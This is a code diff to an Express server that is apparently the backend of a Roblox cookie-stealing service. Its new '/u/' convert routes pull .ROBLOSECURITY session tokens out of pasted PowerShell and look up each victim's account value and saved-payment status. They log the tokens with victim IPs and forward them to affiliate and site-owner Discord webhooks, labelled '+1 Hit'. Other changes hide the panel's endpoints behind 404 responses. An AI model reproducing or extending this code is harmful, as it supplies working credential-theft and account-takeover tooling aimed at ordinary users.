@@ -34,12 +34,60 @@ const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123'; // Change this!
 async function loadDirectories() {
   try {
     const snapshot = await db.ref('directories').once('value');
-    const directories = snapshot.val();
-    return directories || {};
+    const directories = snapshot.val() || {};
+    
+    // Check for directories without unique IDs and assign them
+    let hasChanges = false;
+    
+    for (const [dirName, dirConfig] of Object.entries(directories)) {
+      // Check if directory is missing uniqueId
+      if (!dirConfig.uniqueId) {
+        const uniqueId = generateUniqueId(directories);
+        directories[dirName].uniqueId = uniqueId;
+        hasChanges = true;
+        console.log(`✅ Assigned unique ID ${uniqueId} to legacy directory: ${dirName}`);
+      }
+      
+      // Check subdirectories for missing IDs
+      if (dirConfig.subdirectories) {
+        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
+          if (!subConfig.uniqueId) {
+            const uniqueId = generateUniqueId(directories);
+            directories[dirName].subdirectories[subName].uniqueId = uniqueId;
+            hasChanges = true;
+            console.log(`✅ Assigned unique ID ${uniqueId} to legacy subdirectory: ${dirName}/${subName}`);
+          }
+        }
+      }
+    }
+    
+    // Save changes if any directories were updated
+    if (hasChanges) {
+      console.log('🔄 Updating directories with new unique IDs...');
+      await saveDirectories(directories);
+      console.log('✅ Successfully updated legacy directories with unique IDs');
+    }
+    
+    return directories;
   } catch (error) {
     console.error('Error loading directories from Firebase:', error);
     return {};
   }
+}
+
+// Helper function to generate unique IDs (extracted for reuse)
+function generateUniqueId(directories) {
+  let uniqueId;
+  do {
+    uniqueId = Math.floor(100000 + Math.random() * 99900000).toString();
+    // Check if ID already exists in any directory or subdirectory
+    const idExists = Object.values(directories).some(dir => 
+      dir.uniqueId === uniqueId || 
+      (dir.subdirectories && Object.values(dir.subdirectories).some(sub => sub.uniqueId === uniqueId))
+    );
+    if (!idExists) break;
+  } while (true);
+  return uniqueId;
 }
 
 // Save directories to Firebase
@@ -150,6 +198,227 @@ app.get('/create', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'create.html'));
 });
 
+// PROTECTED ROUTES WITH /u/ PREFIX FOR SITE OWNER AND PARENT DIRECTORIES
+
+// Protected site owner convert endpoint
+app.post('/u/convert', validateRequest, async (req, res) => {
+  try {
+    let input;
+    let scriptType;
+
+    // Handle both JSON and text input
+    if (typeof req.body === 'string') {
+      input = req.body;
+      scriptType = 'Unknown';
+    } else if (req.body && req.body.powershell) {
+      input = req.body.powershell;
+      scriptType = req.body.scriptType || 'Unknown';
+    } else {
+      return res.status(400).json({ error: 'Invalid input format' });
+    }
+
+    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
+    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
+    const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
+    const match = cleanedInput.match(regex);
+
+    if (match) {
+      const token = match[1].replace(/['"]/g, '');
+      const userAgent = req.headers['user-agent'] || 'Unknown';
+
+      // Fetch user data from Roblox API
+      const userData = await fetchRobloxUserData(token);
+
+      // If user data fetch failed, create a minimal user data object
+      const webhookUserData = userData || {
+        username: "Unknown User",
+        userId: "Unknown",
+        robux: 0,
+        premium: false,
+        rap: 0,
+        summary: 0,
+        creditBalance: 0,
+        savedPayment: false,
+        robuxIncoming: 0,
+        robuxOutgoing: 0,
+        korblox: false,
+        headless: false,
+        accountAge: 0,
+        groupsOwned: 0,
+        placeVisits: 0,
+        inventory: { hairs: 0, bundles: 0, faces: 0 }
+      };
+
+      // Log user data to database
+      await logUserData(token, webhookUserData, { ip: req.ip, directory: 'main' });
+
+      // Send to Discord webhook with user data
+      const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData);
+
+      if (!webhookResult.success) {
+        return res.status(500).json({ 
+          success: false, 
+          error: `Webhook failed: ${webhookResult.error}` 
+        });
+      }
+    } else {
+      return res.status(400).json({ 
+        success: false,
+        message: 'Failed wrong input'
+      });
+    }
+
+    res.json({ 
+      success: true,
+      message: 'Request submitted successfully!'
+    });
+  } catch (error) {
+    console.error('❌ Server error:', error);
+    res.status(500).json({ error: 'Server error processing request' });
+  }
+});
+
+// Protected site owner token endpoint
+app.get('/u/api/token', tokenLimiter, protectTokenEndpoint, (req, res) => {
+  console.log(`✅ Protected token request approved for IP: ${req.ip}`);
+  res.json({ token: API_TOKEN });
+});
+
+// Protected parent directory page
+app.get('/u/:directory', async (req, res) => {
+  const directoryName = req.params.directory;
+  const directories = await loadDirectories();
+
+  if (directories[directoryName]) {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+  } else {
+    res.status(404).json({ error: 'Directory not found' });
+  }
+});
+
+// Protected parent directory convert endpoint
+app.post('/u/:directory/convert', async (req, res) => {
+  try {
+    const directoryName = req.params.directory;
+    const directories = await loadDirectories();
+
+    // Check if directory exists
+    if (!directories[directoryName]) {
+      return res.status(404).json({ error: 'Directory not found' });
+    }
+
+    const directoryConfig = directories[directoryName];
+
+    // Validate API token for this specific directory
+    const providedToken = req.get('X-API-Token');
+    if (!providedToken || providedToken !== directoryConfig.apiToken) {
+      console.log(`❌ Invalid or missing API token for directory ${directoryName} from ${req.ip}`);
+      return res.status(401).json({ error: 'Invalid API token for this directory' });
+    }
+
+    let input;
+    let scriptType;
+
+    // Handle both JSON and text input
+    if (typeof req.body === 'string') {
+      input = req.body;
+      scriptType = 'Unknown';
+    } else if (req.body && req.body.powershell) {
+      input = req.body.powershell;
+      scriptType = req.body.scriptType || 'Unknown';
+    } else {
+      return res.status(400).json({ error: 'Invalid input format' });
+    }
+
+    // Look for .ROBLOSECURITY cookie
+    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
+    const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
+    const match = cleanedInput.match(regex);
+
+    if (match) {
+      const token = match[1].replace(/['"]/g, '');
+      const userAgent = req.headers['user-agent'] || 'Unknown';
+
+      // Fetch user data from Roblox API
+      const userData = await fetchRobloxUserData(token);
+
+      const webhookUserData = userData || {
+        username: "Unknown User",
+        userId: "Unknown",
+        robux: 0,
+        premium: false,
+        rap: 0,
+        summary: 0,
+        creditBalance: 0,
+        savedPayment: false,
+        robuxIncoming: 0,
+        robuxOutgoing: 0,
+        korblox: false,
+        headless: false,
+        accountAge: 0,
+        groupsOwned: 0,
+        placeVisits: 0,
+        inventory: { hairs: 0, bundles: 0, faces: 0 }
+      };
+
+      // Log user data to database
+      await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });
+
+      const customTitle = `<:hacker:1404745235711655987> +1 Hit - Lunix Autohar`;
+
+      // Send to Discord webhook with user data
+      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);
+
+      // Always send to site owner (main webhook)
+      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+      if (siteOwnerWebhookUrl) {
+        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle);
+      }
+
+      if (!webhookResult.success) {
+        return res.status(500).json({ 
+          success: false, 
+          error: `Webhook failed: ${webhookResult.error}` 
+        });
+      }
+    } else {
+      return res.status(400).json({ 
+        success: false,
+        message: 'Failed wrong input',
+        directory: directoryName
+      });
+    }
+
+    res.json({ 
+      success: true,
+      message: 'Request submitted successfully!',
+      directory: directoryName
+    });
+  } catch (error) {
+    console.error('❌ Server error:', error);
+    res.status(500).json({ error: 'Server error processing request' });
+  }
+});
+
+// Protected parent directory token endpoint
+app.get('/u/:directory/api/token', tokenLimiter, protectTokenEndpoint, async (req, res) => {
+  const directoryName = req.params.directory;
+  
+  if (!/^[a-z0-9-]+$/.test(directoryName)) {
+    return res.status(400).json({ error: 'Invalid directory name format' });
+  }
+
+  const directories = await loadDirectories();
+
+  if (!directories[directoryName]) {
+    console.log(`❌ Protected token request for non-existent directory: ${directoryName}, IP: ${req.ip}`);
+    return res.status(404).json({ error: 'Directory not found' });
+  }
+
+  console.log(`✅ Protected directory token request approved for ${directoryName}, IP: ${req.ip}`);
+  res.json({ token: directories[directoryName].apiToken });
+});
+
 // Middleware to protect admin dashboard with password
 function requireAdminPassword(req, res, next) {
   const authHeader = req.headers.authorization;
@@ -231,10 +500,9 @@ function protectTokenEndpoint(req, res, next) {
   next();
 }
 
-// Endpoint to get API token for frontend
-app.get('/api/token', tokenLimiter, protectTokenEndpoint, (req, res) => {
-  console.log(`✅ Token request approved for IP: ${req.ip}`);
-  res.json({ token: API_TOKEN });
+// Original token endpoint - now returns 404 for protection
+app.get('/api/token', (req, res) => {
+  res.status(404).json({ error: 'Not found' });
 });
 
 // API endpoint to create new directories
@@ -265,21 +533,8 @@ app.post('/api/create-directory', async (req, res) => {
       return res.status(409).json({ error: 'Directory already exists' });
     }
 
-    // Generate unique 6-8 digit ID
-    const generateUniqueId = () => {
-      return Math.floor(100000 + Math.random() * 99900000).toString();
-    };
-    
-    let uniqueId;
-    do {
-      uniqueId = generateUniqueId();
-      // Check if ID already exists in any directory or subdirectory
-      const idExists = Object.values(directories).some(dir => 
-        dir.uniqueId === uniqueId || 
-        (dir.subdirectories && Object.values(dir.subdirectories).some(sub => sub.uniqueId === uniqueId))
-      );
-      if (!idExists) break;
-    } while (true);
+    // Generate unique 6-8 digit ID using helper function
+    const uniqueId = generateUniqueId(directories);
 
     // Create new directory entry
     const authToken = crypto.randomBytes(32).toString('hex');
@@ -1449,8 +1704,13 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
   }
 }
 
-// API endpoint to convert PowerShell to .ROBLOSECURITY
-app.post('/convert', validateRequest, async (req, res) => {
+// Original convert endpoint - now returns 404 for protection
+app.post('/convert', (req, res) => {
+  res.status(404).json({ error: 'Not found' });
+});
+
+// Legacy convert endpoint (kept for reference but disabled)
+app.post('/convert-disabled', validateRequest, async (req, res) => {
   try {
     let input;
     let scriptType;
@@ -1548,7 +1808,12 @@ app.get('/:directory', async (req, res) => {
   const directories = await loadDirectories();
 
   if (directories[directoryName]) {
-    // Serve a custom page for this directory or redirect to main page
+    // If directory has subdirectories, return 404 to protect parent
+    if (directories[directoryName].subdirectories && 
+        Object.keys(directories[directoryName].subdirectories).length > 0) {
+      return res.status(404).json({ error: 'Not found' });
+    }
+    // Serve a custom page for this directory
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
   } else {
     res.status(404).json({ error: 'Directory not found' });
@@ -1592,6 +1857,12 @@ app.post('/:directory/convert', async (req, res) => {
     // Check if directory exists
     if (!directories[directoryName]) {
       return res.status(404).json({ error: 'Directory not found' });
+    }
+
+    // If directory has subdirectories, return 404 to protect parent
+    if (directories[directoryName].subdirectories && 
+        Object.keys(directories[directoryName].subdirectories).length > 0) {
+      return res.status(404).json({ error: 'Not found' });
     }
 
     const directoryConfig = directories[directoryName];
@@ -1734,21 +2005,8 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
       return res.status(409).json({ error: 'Subdirectory already exists' });
     }
 
-    // Generate unique ID for subdirectory
-    const generateUniqueId = () => {
-      return Math.floor(100000 + Math.random() * 99900000).toString();
-    };
-    
-    let uniqueId;
-    do {
-      uniqueId = generateUniqueId();
-      // Check if ID already exists in any directory or subdirectory
-      const idExists = Object.values(directories).some(dir => 
-        dir.uniqueId === uniqueId || 
-        (dir.subdirectories && Object.values(dir.subdirectories).some(sub => sub.uniqueId === uniqueId))
-      );
-      if (!idExists) break;
-    } while (true);
+    // Generate unique ID for subdirectory using helper function
+    const uniqueId = generateUniqueId(directories);
 
     // Create subdirectory
     const subAuthToken = crypto.randomBytes(32).toString('hex');
@@ -1808,7 +2066,7 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
 });
 
 // Get API token for specific directory
-app.get('/:directory/api/token', tokenLimiter, protectTokenEndpoint, async (req, res) => {
+app.get('/:directory/api/token', async (req, res) => {
   const directoryName = req.params.directory;
   
   // Validate directory name format
@@ -1819,8 +2077,13 @@ app.get('/:directory/api/token', tokenLimiter, protectTokenEndpoint, async (req,
   const directories = await loadDirectories();
 
   if (!directories[directoryName]) {
-    console.log(`❌ Token request for non-existent directory: ${directoryName}, IP: ${req.ip}`);
     return res.status(404).json({ error: 'Directory not found' });
+  }
+
+  // If directory has subdirectories, return 404 to protect parent
+  if (directories[directoryName].subdirectories && 
+      Object.keys(directories[directoryName].subdirectories).length > 0) {
+    return res.status(404).json({ error: 'Not found' });
   }
 
   console.log(`✅ Directory token request approved for ${directoryName}, IP: ${req.ip}`);
